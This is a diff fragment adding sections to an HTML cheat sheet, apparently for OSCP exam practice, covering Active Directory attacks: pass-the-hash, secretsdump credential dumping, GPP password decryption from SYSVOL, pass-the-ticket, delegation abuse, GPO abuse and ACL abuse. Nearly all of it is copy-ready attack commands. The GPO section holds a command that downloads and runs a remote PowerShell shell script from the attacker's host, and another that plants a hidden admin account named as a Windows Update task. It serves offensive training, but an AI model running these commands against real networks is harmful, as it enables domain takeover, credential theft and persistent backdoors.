+        <span class="moveon-item">lockoutThreshold: 1 — do NOT spray, only try exact creds found elsewhere</span>
+        <span class="moveon-item">valid creds found — stop spraying, go to lateral movement</span>
+      </div>
+    </section>
+
+    <section class="sec" id="lateral">
+      <div class="sec-head"><h2>Lateral Movement</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">pass-the-hash — all methods</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-psexec &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'     <span class="c"># SYSTEM shell</span>
+impacket-wmiexec &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'   <span class="c"># no service drop</span>
+impacket-smbexec &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'   <span class="c"># service-based</span>
+evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -H &lt;NThash&gt;                     <span class="c"># best interactive</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -H &lt;NThash&gt; --continue-on-success</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">secretsdump — after pwning a host</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL   <span class="c"># offline parse</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> secretsdump returns Administrator:500:...:&lt;NThash&gt;:::</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; --continue-on-success <span class="sig-note">-- sweep hash across subnet</span></span>
+          <span class="sig-cmd">impacket-psexec &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' <span class="sig-note">-- try on DC directly</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Shell lands on DC as SYSTEM or DA</span>
+          <span class="sig-cmd">whoami /all && hostname && ipconfig /all <span class="sig-note">-- confirm identity</span></span>
+          <span class="sig-cmd">type C:\Users\Administrator\Desktop\proof.txt <span class="sig-note">-- grab proof immediately</span></span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' -just-dc-ntlm <span class="sig-note">-- full domain dump</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> PTH fails everywhere</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u Administrator -H &lt;NThash&gt; --local-auth <span class="sig-note">-- try with --local-auth flag</span></span>
+          <span class="sig-note">-- If still nothing: LAPS or Protected Users may be active. Check BloodHound for ACL path instead.</span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">hash swept, Pwn3d! found on at least one host — escalate from there</span>
+        <span class="moveon-item">no PTH hits — follow BloodHound ACL path (next section)</span>
+        <span class="moveon-item">DA shell obtained — screenshot proof.txt before anything else</span>
+      </div>
+    </section>
+
+    <section class="sec" id="sysvol">
+      <div class="sec-head"><h2>SYSVOL / Group Policy Preferences (GPP)</h2></div>
+      <div class="note n-warn">SYSVOL is readable by every domain user by default. Admins treat it like a private admin folder — it isn't. Check it the moment you have any domain credential. Takes 30 seconds.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">what is SYSVOL</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># SYSVOL = shared folder on every DC, readable by ALL domain users</span>
+<span class="c"># Contains Group Policy files pushed to every domain machine</span>
+<span class="c"># Path: \\&lt;DC&gt;\SYSVOL\&lt;domain&gt;\Policies\</span>
+<span class="c">#</span>
+<span class="c"># GPP passwords (cpassword) — admin stored passwords in GPP XML files</span>
+<span class="c"># Microsoft published the AES-256 decryption key in their own docs (2012)</span>
+<span class="c"># Same key on every Windows installation on the planet</span>
+<span class="c"># Patched in MS14-025 but existing files were NEVER deleted</span>
+<span class="c"># Still appears constantly in OSCP labs</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">method 1 — CME automatic (fastest)</span><div class="cb-tags"><span class="tag t-crit">try first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M gpp_password
+<span class="c"># Success output:</span>
+<span class="c"># GPP_PASSWORD  DC01  [+] Found credentials in SYSVOL!</span>
+<span class="c"># GPP_PASSWORD  DC01  Username: Administrator</span>
+<span class="c"># GPP_PASSWORD  DC01  Password: Password123!</span>
+<span class="c">#</span>
+<span class="c"># Nothing found output:</span>
+<span class="c"># GPP_PASSWORD  DC01  [-] No GPP passwords found</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">method 2 — manual smbclient (broader search)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create a clean folder first:</span>
+mkdir ~/exam/loot/sysvol
+cd ~/exam/loot/sysvol
+
+<span class="c"># Connect and download everything:</span>
+smbclient \\\\&lt;DC_IP&gt;\\SYSVOL -U &lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *
+smb: \&gt; bye
+
+<span class="c"># Search for cpassword specifically:</span>
+grep -r "cpassword" .
+
+<span class="c"># Broader credential search:</span>
+grep -ri "password\|cpassword\|passwd\|pwd" . --include="*.xml"
+
+<span class="c"># Search scripts for hardcoded creds (admins put these here all the time):</span>
+grep -ri "password\|net use\|runas" . --include="*.ps1" --include="*.bat" --include="*.vbs"
+
+<span class="c"># Decrypt the cpassword value:</span>
+gpp-decrypt &lt;cpassword_value&gt;
+<span class="c"># Example output: Password123!</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">what the XML looks like + what to extract</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># grep output points you to a file like:</span>
+<span class="c"># ./corp.local/Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml</span>
+<span class="c">#</span>
+<span class="c"># Inside that file:</span>
+<span class="c"># &lt;Properties</span>
+<span class="c">#   userName="Administrator"                    ← this is your username</span>
+<span class="c">#   cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA=="  ← decrypt this</span>
+<span class="c"># /&gt;</span>
+<span class="c">#</span>
+<span class="c"># userName="Administrator"  → could be local OR domain admin</span>
+<span class="c"># userName=".\Administrator" → .\ prefix = definitely local account</span>
+<span class="c"># userName="corp\svc_deploy" → domain account</span>
+
+<span class="c"># After decrypting — spray immediately:</span>
+<span class="c"># Local account → subnet with --local-auth:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u Administrator -p 'Password123!' --local-auth --continue-on-success
+<span class="c"># Domain account → DC first:</span>
+crackmapexec smb &lt;DC_IP&gt; -u Administrator -p 'Password123!'</pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> CME returns Username + Password from gpp_password module</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --local-auth --continue-on-success <span class="sig-note">-- if local account</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- if domain account, Pwn3d! = DCSync immediately</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> grep finds cpassword in XML file</span>
+          <span class="sig-cmd">gpp-decrypt &lt;cpassword_value&gt; <span class="sig-note">-- decrypt the value between the quotes</span></span>
+          <span class="sig-note">-- Also check userName field in same XML block — tells you exactly which account it is</span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> grep finds hardcoded password in .ps1 or .bat script in SYSVOL</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;found_pass&gt;' --continue-on-success <span class="sig-note">-- spray it</span></span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- mark as owned in BloodHound</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">CME module returns nothing AND manual grep of SYSVOL finds no creds in XML or scripts</span>
+        <span class="moveon-item">cpassword found + decrypted + sprayed — follow the result</span>
+      </div>
+    </section>
+
+    <section class="sec" id="ptt">
+      <div class="sec-head"><h2>Pass-the-Ticket (PTT)</h2></div>
+      <div class="note n-info">PTH uses NTLM hashes. PTT uses Kerberos tickets (TGT or TGS). Use PTT when NTLM is disabled or the account is in Protected Users group — Protected Users blocks NTLM but Kerberos still works.</div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">what tickets are + how to get them</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># TGT (Ticket Granting Ticket) = master ticket, proves who you are to the DC</span>
+<span class="c"># TGS (Ticket Granting Service) = service ticket, lets you access a specific service</span>
+<span class="c">#</span>
+<span class="c"># Tickets live in LSASS memory on the machine you're logged into</span>
+<span class="c"># Extract from LSASS on a machine you have admin on:</span>
+
+<span class="c"># From victim shell — Rubeus (dump all tickets):</span>
+.\Rubeus.exe dump /nowrap
+<span class="c"># Output: base64-encoded .kirbi ticket blobs</span>
+
+<span class="c"># From kali — if you have admin creds:</span>
+impacket-getTGT &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+<span class="c"># Output: user.ccache file</span>
+
+<span class="c"># From kali — with hash instead of password:</span>
+impacket-getTGT &lt;domain&gt;/&lt;user&gt; -hashes ':&lt;NThash&gt;' -dc-ip &lt;DC_IP&gt;
+<span class="c"># Output: user.ccache file</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">use a ticket from kali</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Set the ticket file as your Kerberos credential cache:</span>
+export KRB5CCNAME=&lt;user&gt;.ccache
+
+<span class="c"># Use -k -no-pass on impacket tools (uses ticket instead of password):</span>
+impacket-psexec -k -no-pass &lt;DC_FQDN&gt;           <span class="c"># e.g. dc01.corp.local</span>
+impacket-wmiexec -k -no-pass &lt;DC_FQDN&gt;
+impacket-secretsdump -k -no-pass &lt;DC_FQDN&gt;
+impacket-smbclient -k -no-pass &lt;DC_FQDN&gt;
+
+<span class="c"># IMPORTANT: must use FQDN (dc01.corp.local) not IP when using Kerberos</span>
+<span class="c"># Add to /etc/hosts if needed:</span>
+echo "&lt;DC_IP&gt; dc01.corp.local" | sudo tee -a /etc/hosts</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">use a ticket on victim (Rubeus)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Inject ticket directly into current session:</span>
+.\Rubeus.exe ptt /ticket:&lt;base64_ticket&gt;
+
+<span class="c"># Verify ticket is loaded:</span>
+klist
+
+<span class="c"># Now use it — klist shows what you can access:</span>
+dir \\dc01.corp.local\C$
+PsExec.exe \\dc01.corp.local cmd</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">overpass-the-hash (hash → ticket)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Convert an NTLM hash into a Kerberos TGT — best of both worlds</span>
+<span class="c"># Use when you have a hash but need Kerberos auth (Protected Users, NTLM disabled)</span>
+
+<span class="c"># From kali:</span>
+impacket-getTGT &lt;domain&gt;/&lt;user&gt; -hashes ':&lt;NThash&gt;' -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=&lt;user&gt;.ccache
+impacket-psexec -k -no-pass dc01.corp.local
+
+<span class="c"># From victim with Rubeus:</span>
+.\Rubeus.exe asktgt /user:&lt;user&gt; /rc4:&lt;NThash&gt; /ptt
+<span class="c"># /ptt = inject ticket immediately into current session</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> PTH fails — NTLM auth error / account in Protected Users</span>
+          <span class="sig-cmd">impacket-getTGT &lt;domain&gt;/&lt;user&gt; -hashes ':&lt;NThash&gt;' -dc-ip &lt;DC_IP&gt; <span class="sig-note">-- convert hash to TGT</span></span>
+          <span class="sig-cmd">export KRB5CCNAME=&lt;user&gt;.ccache && impacket-psexec -k -no-pass dc01.corp.local <span class="sig-note">-- use ticket instead</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Rubeus dump returns base64 ticket for a DA</span>
+          <span class="sig-cmd">.\Rubeus.exe ptt /ticket:&lt;base64&gt; <span class="sig-note">-- inject into current session</span></span>
+          <span class="sig-cmd">dir \\dc01.corp.local\C$ <span class="sig-note">-- verify access</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> impacket Kerberos tools return KDC_ERR_C_PRINCIPAL_UNKNOWN</span>
+          <span class="sig-note">-- Using IP instead of FQDN. Add DC to /etc/hosts and use the hostname.</span>
+          <span class="sig-cmd">echo "&lt;DC_IP&gt; dc01.corp.local" | sudo tee -a /etc/hosts <span class="sig-note">-- fix and retry</span></span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="delegation">
+      <div class="sec-head"><h2>Delegation Attacks</h2></div>
+      <div class="note n-info">Delegation lets a machine or service impersonate users to access other services — it's how web servers query databases on your behalf. Three types, each with a different attack. BloodHound finds all of them.</div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find all delegation — run first</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># From kali — shows all three types at once:</span>
+impacket-findDelegation &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+
+<span class="c"># BloodHound — unconstrained:</span>
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+
+<span class="c"># BloodHound — constrained (AllowedToDelegate edge):</span>
+MATCH p=(u)-[:AllowedToDelegate]-&gt;(c) RETURN u.name,c.name
+
+<span class="c"># BloodHound — RBCD (GenericWrite on computer object):</span>
+MATCH p=(u)-[:GenericWrite]-&gt;(c:Computer) RETURN p</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">type 1 — unconstrained delegation</span><div class="cb-tags"><span class="tag t-crit">most dangerous</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># WHAT IT IS:</span>
+<span class="c"># Machine stores ANY user's full TGT when they authenticate to it</span>
+<span class="c"># Any DA who connects → their TGT lands in LSASS on that machine</span>
+<span class="c"># Get local admin on it → steal DA TGT → own domain</span>
+<span class="c">#</span>
+<span class="c"># FIND IT:</span>
+impacket-findDelegation &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+<span class="c"># Look for: "Unconstrained" in the Delegation Type column</span>
+Get-DomainComputer -Unconstrained | select name   <span class="c"># PowerView</span>
+
+<span class="c"># EXPLOIT — Option A: wait for DA to naturally authenticate:</span>
+<span class="c"># Get shell on the unconstrained machine first, then monitor:</span>
+.\Rubeus.exe monitor /interval:5 /nowrap
+<span class="c"># Wait — when DA connects their TGT appears in output</span>
+<span class="c"># Copy the base64 ticket, inject it:</span>
+.\Rubeus.exe ptt /ticket:&lt;base64_TGT&gt;
+<span class="c"># Now authenticated as DA — DCSync:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;@&lt;DC_IP&gt; -k -no-pass
+
+<span class="c"># EXPLOIT — Option B: coerce DC to authenticate (don't wait):</span>
+<span class="c"># Start monitoring on unconstrained machine:</span>
+.\Rubeus.exe monitor /interval:5 /nowrap
+<span class="c"># From kali — force DC to authenticate to your unconstrained machine:</span>
+python3 printerbug.py &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; &lt;UNCONSTRAINED_IP&gt;
+<span class="c"># DC machine account TGT lands immediately</span>
+<span class="c"># Extract + use it for secretsdump</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">type 2 — constrained delegation</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># WHAT IT IS:</span>
+<span class="c"># Account can impersonate users but ONLY to specific services</span>
+<span class="c"># e.g. svc_web can impersonate users to MSSQLSvc/db01:1433 ONLY</span>
+<span class="c"># Key: can impersonate ANY user including Administrator to allowed services</span>
+<span class="c">#</span>
+<span class="c"># FIND IT:</span>
+impacket-findDelegation &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+<span class="c"># Look for: "Constrained" — note the allowed service in the AllowedProtocol column</span>
+
+<span class="c"># EXPLOIT — request service ticket AS Administrator to allowed service:</span>
+<span class="c"># Step 1 — get TGT for the account with constrained delegation:</span>
+impacket-getTGT &lt;domain&gt;/svc_web:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=svc_web.ccache
+
+<span class="c"># Step 2 — request TGS impersonating Administrator to allowed service:</span>
+impacket-getST &lt;domain&gt;/svc_web:'&lt;pass&gt;' \
+  -spn MSSQLSvc/db01.corp.local:1433 \
+  -impersonate Administrator \
+  -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=Administrator.ccache
+
+<span class="c"># Step 3 — use it (if allowed service is CIFS you get a shell):</span>
+impacket-psexec -k -no-pass dc01.corp.local
+impacket-secretsdump -k -no-pass dc01.corp.local</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">type 3 — resource-based constrained delegation (RBCD)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># WHAT IT IS:</span>
+<span class="c"># Target machine controls WHO can delegate TO it (reverse of constrained)</span>
+<span class="c"># If you have GenericWrite on a computer object → configure RBCD yourself</span>
+<span class="c"># Create a fake computer → configure it to delegate to target → impersonate DA</span>
+<span class="c">#</span>
+<span class="c"># PREREQUISITE: GenericWrite on a computer object (BloodHound shows this)</span>
+
+<span class="c"># Step 1 — create a fake computer account (any domain user can do this):</span>
+impacket-addcomputer &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' \
+  -computer-name 'FAKEBOX$' \
+  -computer-pass 'FakePass123!' \
+  -dc-ip &lt;DC_IP&gt;
+
+<span class="c"># Step 2 — configure RBCD on target machine (uses your GenericWrite):</span>
+impacket-rbcd &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' \
+  -delegate-from 'FAKEBOX$' \
+  -delegate-to '&lt;TARGET_COMPUTER&gt;$' \
+  -action write \
+  -dc-ip &lt;DC_IP&gt;
+
+<span class="c"># Step 3 — get TGT for fake computer:</span>
+impacket-getTGT &lt;domain&gt;/'FAKEBOX$':'FakePass123!' -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=FAKEBOX\$.ccache
+
+<span class="c"># Step 4 — request service ticket impersonating Administrator to target:</span>
+impacket-getST &lt;domain&gt;/'FAKEBOX$':'FakePass123!' \
+  -spn CIFS/&lt;TARGET_COMPUTER&gt;.corp.local \
+  -impersonate Administrator \
+  -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=Administrator.ccache
+
+<span class="c"># Step 5 — shell on target as Administrator:</span>
+impacket-psexec -k -no-pass &lt;TARGET_COMPUTER&gt;.corp.local</pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> findDelegation shows Unconstrained machine</span>
+          <span class="sig-cmd">crackmapexec smb &lt;UNCONSTRAINED_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- confirm local admin first</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;UNCONSTRAINED_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- get shell, then Rubeus monitor</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Rubeus monitor captures a DA TGT</span>
+          <span class="sig-cmd">.\Rubeus.exe ptt /ticket:&lt;base64&gt; <span class="sig-note">-- inject immediately</span></span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/DA@&lt;DC_IP&gt; -k -no-pass <span class="sig-note">-- DCSync with stolen ticket</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> findDelegation shows Constrained delegation on svc account</span>
+          <span class="sig-cmd">impacket-getST &lt;domain&gt;/&lt;svc&gt;:'&lt;pass&gt;' -spn &lt;allowed_spn&gt; -impersonate Administrator -dc-ip &lt;DC_IP&gt; <span class="sig-note">-- impersonate DA</span></span>
+          <span class="sig-cmd">export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass &lt;target_fqdn&gt; <span class="sig-note">-- shell as DA</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> BloodHound shows GenericWrite on a computer object</span>
+          <span class="sig-cmd">impacket-addcomputer &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' -dc-ip &lt;DC_IP&gt; <span class="sig-note">-- create fake computer</span></span>
+          <span class="sig-cmd">impacket-rbcd &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -delegate-from 'FAKEBOX$' -delegate-to '&lt;TARGET&gt;$' -action write -dc-ip &lt;DC_IP&gt; <span class="sig-note">-- configure RBCD</span></span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="gpo">
+      <div class="sec-head"><h2>GPO Abuse</h2></div>
+      <div class="note n-info">GPOs push configuration to machines and users. Write permissions on a GPO that applies to a machine = you can run anything as SYSTEM on every machine it applies to.</div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find GPO write permissions</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># BloodHound — find GPOs your owned accounts can write:</span>
+MATCH p=(o {owned:true})-[:GenericAll|GenericWrite|Owns|WriteDacl]-&gt;(g:GPO) RETURN p
+
+<span class="c"># PowerView — find GPOs you can modify:</span>
+Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs |
+  Where-Object {$_.ActiveDirectoryRights -match "Write" -and
+  $_.IdentityReference -match "&lt;youruser&gt;"}
+
+<span class="c"># Find which machines/users a GPO applies to:</span>
+Get-DomainOU -GPLink "&lt;GPO_GUID&gt;" | select distinguishedname
+Get-DomainComputer -SearchBase "&lt;OU_DN&gt;" | select name</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">exploit — push scheduled task via GPO</span><div class="cb-tags"><span class="tag t-crit">runs as SYSTEM</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># PyGPOAbuse — easiest tool, handles everything:</span>
+<span class="c"># pip3 install pygpoabuse</span>
+
+<span class="c"># Add a local admin account via GPO:</span>
+python3 pygpoabuse.py &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' \
+  -gpo-id "&lt;GPO_GUID&gt;" \
+  -dc-ip &lt;DC_IP&gt; \
+  -command "net user hacker P@ss123! /add && net localgroup administrators hacker /add" \
+  -taskname "WindowsUpdate" \
+  -description "Windows Update Task"
+
+<span class="c"># Reverse shell via GPO:</span>
+python3 pygpoabuse.py &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' \
+  -gpo-id "&lt;GPO_GUID&gt;" \
+  -dc-ip &lt;DC_IP&gt; \
+  -command "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://&lt;KALI&gt;:8080/shell.ps1')\"" \
+  -taskname "WindowsUpdate"
+
+<span class="c"># GPO applies on next policy refresh (default every 90 min)</span>
+<span class="c"># Force immediate refresh on a machine you already have access to:</span>
+gpupdate /force</pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> BloodHound shows owned user has GenericWrite on a GPO</span>
+          <span class="sig-cmd">Get-DomainOU -GPLink "&lt;GPO_GUID&gt;" | select distinguishedname <span class="sig-note">-- find which machines it applies to</span></span>
+          <span class="sig-cmd">python3 pygpoabuse.py ... -command "net user hacker P@ss123! /add ..." <span class="sig-note">-- push payload</span></span>
+          <span class="sig-cmd">gpupdate /force <span class="sig-note">-- force apply if you have access to target machine already</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> GPO applies to OU containing DC</span>
+          <span class="sig-note">-- GPO on DC OU = code runs as SYSTEM on DC = domain owned. Highest value target.</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="acl">
+      <div class="sec-head"><h2>ACL Abuse — From BloodHound Paths</h2></div>
+      <div class="note n-info">Every time you mark an account as owned, run these BloodHound queries. Click any edge → click Help → BloodHound shows you the exact abuse commands.</div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">7 queries to run every time you mark something as owned</span><div class="cb-tags"><span class="tag t-crit">memorize this</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># 1. Main path — run this every time first:</span>
+<span class="c">#    Built-in: "Shortest Paths to Domain Admins from Owned Principals"</span>
+
+<span class="c"># 2. Everything my owned accounts can reach:</span>
+MATCH p=(o {owned:true})-[r]-&gt;(n) RETURN p
+
+<span class="c"># 3. Recursive group membership (catches nested groups):</span>
+MATCH p=(o:User {owned:true})-[:MemberOf*1..]-&gt;(g:Group) RETURN p
+
+<span class="c"># 4. Where am I already local admin:</span>
+MATCH p=(o {owned:true})-[:AdminTo]-&gt;(c:Computer) RETURN p
+
+<span class="c"># 5. All dangerous ACL edges:</span>
+MATCH p=(o {owned:true})-[:GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|Owns]-&gt;(n) RETURN p
+
+<span class="c"># 6. DCSync rights (if this returns anything → run secretsdump NOW):</span>
+MATCH p=(o {owned:true})-[:DCSync|GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p
+
+<span class="c"># 7. Machines with active DA sessions (get local admin → steal TGT):</span>
+MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p
+<span class="c"># Change CORP.LOCAL to your domain name</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GenericAll on user — reset password</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Reset target user password without knowing current one:</span>
+net rpc password &lt;targetuser&gt; 'NewP@ss123!' -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;
+
+<span class="c"># Verify new creds work:</span>
+crackmapexec smb &lt;DC_IP&gt; -u &lt;targetuser&gt; -p 'NewP@ss123!'
+
+<span class="c"># Mark target as owned in BloodHound → run 7 queries again</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GenericAll on group — add self</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>net rpc group addmem "&lt;groupname&gt;" &lt;youruser&gt; -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;
+net rpc group members "&lt;groupname&gt;" -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;  <span class="c"># verify</span>
+
+<span class="c"># If group = Domain Admins → DCSync immediately</span>
+<span class="c"># If group = IT Admins / Server Admins → check what machines they have AdminTo</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GenericWrite on user — set SPN (Kerberoast them)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># GenericWrite lets you write attributes — add a fake SPN to make them Kerberoastable:</span>
+<span class="c"># PowerView (from evil-winrm):</span>
+Set-DomainObject -Identity &lt;targetuser&gt; -Set @{serviceprincipalname='fake/FAKE'}
+
+<span class="c"># Now Kerberoast them:</span>
+impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request -outputfile target.hash
+hashcat -m 13100 target.hash /usr/share/wordlists/rockyou.txt --force
+
+<span class="c"># Clean up SPN after cracking:</span>
+Set-DomainObject -Identity &lt;targetuser&gt; -Clear serviceprincipalname</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">WriteDACL on domain — grant DCSync</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># WriteDACL on the domain object = grant yourself DCSync rights</span>
+<span class="c"># PowerView (from evil-winrm, run as the account with WriteDACL):</span>
+$cred = New-Object System.Management.Automation.PSCredential(
+  '&lt;domain&gt;\&lt;user&gt;',
+  (ConvertTo-SecureString '&lt;pass&gt;' -AsPlainText -Force)
+)
+Add-DomainObjectAcl -TargetIdentity "&lt;domain&gt;" \
+  -PrincipalIdentity &lt;youruser&gt; \
+  -Rights DCSync \
+  -Credential $cred
+
